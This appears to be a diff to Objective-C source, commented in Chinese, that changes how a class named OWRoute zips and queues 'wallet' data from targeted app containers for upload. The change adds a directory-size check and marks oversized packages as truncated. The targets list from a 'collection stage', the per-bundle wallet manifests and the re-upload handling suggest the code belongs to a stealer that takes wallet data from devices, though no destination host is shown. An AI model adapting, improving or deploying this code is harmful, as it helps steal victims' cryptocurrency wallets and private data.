@@ -18,6 +18,7 @@
 - (OWUploadPriority)_priorityForName:(NSString *)name;
 - (void)_onUploadDone:(NSNotification *)n;
 - (void)_onPendingDrained:(NSNotification *)n;
+- (uint64_t)_directoryBytes:(NSString *)dir;
 @end
 
 @implementation OWRoute {
@@ -271,7 +272,21 @@
         return;
     }
 
-    NSDictionary *manifest = [self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]];
+    // 目标体积上限来自采集阶段（targets.plist 的 maxBytes，缺省 150MB）。
+    // 先算目录总量判断是否会被 zip 截断，截断就在 manifest 里标出来，不再静默丢。
+    uint64_t cap = [r[@"maxBytes"] unsignedLongLongValue];
+    if (cap == 0) cap = 150ULL * 1024 * 1024;
+    uint64_t totalBytes = [self _directoryBytes:p];
+    BOOL truncated = totalBytes > cap;
+    NSMutableDictionary *manifest =
+        [[self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]] mutableCopy];
+    if (truncated) {
+        manifest[@"truncated"] = @YES;
+        manifest[@"droppedBytes"] = @(totalBytes - cap);
+        OWLog(@"上传: %@ 超单目标上限（%llu B > %llu B），包内会截断，manifest 标 truncated",
+              name, totalBytes, cap);
+    }
+
     // 固定名字：同一目标重跑时覆盖临时 zip，避免每次生成新名字
     NSString *safeName = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
     // 目标包已在 pending 里（入队后被杀/上传失败）：别再打一份，交给补传
@@ -288,7 +303,7 @@
                              manifest:manifest
                                subdir:bid
                              maxBytes:200ULL * 1024 * 1024
-                             totalCap:150ULL * 1024 * 1024
+                             totalCap:cap
                                 error:&e];
     if (ok) {
         BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer
@@ -320,6 +335,19 @@
         return OWUploadPriorityNotes;
     }
     return OWUploadPriorityContainer;
+}
+
+/// 目录内所有文件的字节数（workDir 在自己容器里，stat 很便宜）
+- (uint64_t)_directoryBytes:(NSString *)dir {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    uint64_t total = 0;
+    for (NSString *rel in [fm enumeratorAtPath:dir]) {
+        NSDictionary *a = [fm attributesOfItemAtPath:[dir stringByAppendingPathComponent:rel]
+                                              error:nil];
+        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
+        total += [a fileSize];
+    }
+    return total;
 }
 
 - (NSDictionary *)_walletManifestForName:(NSString *)name
